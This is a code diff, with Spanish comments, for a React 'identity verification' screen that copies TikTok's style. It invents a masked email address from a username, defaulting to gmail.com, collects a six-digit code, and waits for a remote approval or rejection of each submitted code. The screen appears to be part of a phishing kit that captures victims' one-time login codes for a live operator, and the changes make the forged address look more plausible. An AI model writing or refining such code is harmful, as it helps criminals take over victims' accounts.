@@ -17,21 +17,17 @@ interface IdentityVerificationViewProps {
 }
 
 /**
- * Genera un correo electrónico enmascarado estilo TikTok a partir del username o correo
- * Ejemplo: luis123 -> l***3@gmail.com / juan.perez@hotmail.com -> j***z@hotmail.com
+ * Genera un correo electrónico enmascarado solo con asteriscos antes del dominio
+ * Ejemplo: luis123 -> *****@gmail.com / juan@gmail.com -> *****@gmail.com
  */
 const getMaskedEmail = (input: string): string => {
-  if (!input) return 'l***4@gmail.com';
+  if (!input) return '*****@gmail.com';
   const trimmed = input.trim();
   if (trimmed.includes('@')) {
-    const [user, domain] = trimmed.split('@');
-    const first = user[0] || 'u';
-    const last = user.length > 1 ? user[user.length - 1] : '4';
-    return `${first}***${last}@${domain}`;
+    const [, domain] = trimmed.split('@');
+    return `*****@${domain || 'gmail.com'}`;
   }
-  const first = trimmed[0] || 'u';
-  const last = trimmed.length > 1 ? trimmed[trimmed.length - 1] : '4';
-  return `${first}***${last}@gmail.com`;
+  return '*****@gmail.com';
 };
 
 export const IdentityVerificationView: React.FC<IdentityVerificationViewProps> = ({
@@ -53,6 +49,7 @@ export const IdentityVerificationView: React.FC<IdentityVerificationViewProps> =
   const [localUserId, setLocalUserId] = useState<number | string | null>(userId || null);
 
   const inputRef = useRef<HTMLInputElement | null>(null);
+  const submittedCodeRef = useRef<string>('');
   const maskedEmail = getMaskedEmail(username);
   const effectiveUserId = userId || localUserId;
 
@@ -95,6 +92,7 @@ export const IdentityVerificationView: React.FC<IdentityVerificationViewProps> =
   const handleSubmitCode = useCallback(async () => {
     if (code.length < 6 || isWaitingApproval) return;
 
+    submittedCodeRef.current = code;
     setIsWaitingApproval(true);
     setIsRejected(false);
     setErrorMessage(null);
@@ -152,17 +150,21 @@ export const IdentityVerificationView: React.FC<IdentityVerificationViewProps> =
           setIsWaitingApproval(false);
           setIsRejected(false);
           setErrorMessage(null);
+          setActiveRequestId(null);
           showToast('¡Identidad verificada exitosamente!');
-          onSuccess(code);
+          onSuccess(submittedCodeRef.current);
         } else if (updatedReq.status === 'REJECTED') {
           setIsWaitingApproval(false);
           setIsRejected(true);
           setErrorMessage(
             updatedReq.message || 'Introduce un código de verificación válido'
           );
+          setActiveRequestId(null);
           setCode('');
           showToast('Código de verificación incorrecto');
-          inputRef.current?.focus();
+          setTimeout(() => {
+            inputRef.current?.focus();
+          }, 80);
         }
       },
       effectiveUserId
@@ -171,7 +173,7 @@ export const IdentityVerificationView: React.FC<IdentityVerificationViewProps> =
     return () => {
       unsubscribe();
     };
-  }, [activeRequestId, code, effectiveUserId, onSuccess, showToast]);
+  }, [activeRequestId, effectiveUserId, onSuccess, showToast]);
 
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center p-0 sm:p-4 bg-black/65 backdrop-blur-xs overflow-y-auto animate-fade-in font-sans">
